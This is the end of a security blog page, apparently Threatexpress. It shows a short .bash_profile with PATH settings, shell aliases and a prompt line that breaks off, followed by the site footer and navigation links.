<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span># .bash_profile

PATH=$PATH:/home/james/

export PATH

alias ls=&#39;ls -G&#39;
alias grep=&#39;grep --color=auto&#39;
alias la=&#39;ls -AlahG&#39;
alias el=&#39;sudo $(history -p !!)&#39;
alias ll=&#39;ls -alF&#39;
alias l=&#39;ls -CF&#39;
alias lg=&#39;ls -AlahG |grep $1&#39;
alias netstati=&#39;lsof -P -i -n&#39;

export PS1=&quot;nn[$(if [[ $? == 0 ]]; then echo &quot;[$GREEN]✓&quot;; else echo &quot;[$RED]✕&quot;; fi)[
</pre></div>
</td></tr></table>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../../.." title="Home" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Home
              </span>
            </div>
          </a>
        
        
          <a href="../../../2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/" title="A Deep Dive into Cobalt Strike Malleable C2" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                A Deep Dive into Cobalt Strike Malleable C2
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            © 2019 Threatexpress
          </div>
        
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/threatexpress" class="md-footer-social__link fa fa-github"></a>
    
      <a href="https://twitter.com/joevest" class="md-footer-social__link fa fa-twitter"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.9e1f3b71.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
      
        <script src="https://platform.twitter.com/widgets.js"></script>
      
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
      
        <script src="../../../../js/extra.js"></script>
      
    
    
      
    
  </body>
</html>